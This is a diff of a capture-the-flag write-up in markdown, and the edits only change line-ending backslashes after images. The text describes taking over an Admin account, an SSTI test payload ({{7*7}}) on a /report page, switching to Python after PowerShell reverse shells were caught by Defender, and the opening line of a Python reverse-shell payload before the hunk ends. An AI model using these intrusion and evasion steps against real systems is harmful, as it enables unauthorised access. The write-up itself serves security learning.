@@ -12,10 +12,10 @@ With Excel confirmed as the backend, it is possible to retrieve the Admin passwo
 The password is revealed after logging in as the user.\
 ![username](./assets/username.png)\
 It is now possible to log in as the Admin user.\
-![admin](./assets/admin.png)\
+![admin](./assets/admin.png)
 ## Reverse shell in SSTI
 After logging in as Admin, is is possible to access the /report page. An SSTI vulnerability is identified by entering the payload `{{7*7}}` as the name while registerring a user.\
-![ssti](./assets/ssti.png)
+![ssti](./assets/ssti.png)\
 During the competition, we first attempted to use PowerShell for a reverse shell, but these attempts were caught by Defender AntiVirus. However, switching to Python is simpler. The following payload is used for reverse shell
 ```
 import os,socket,subprocess,threading;
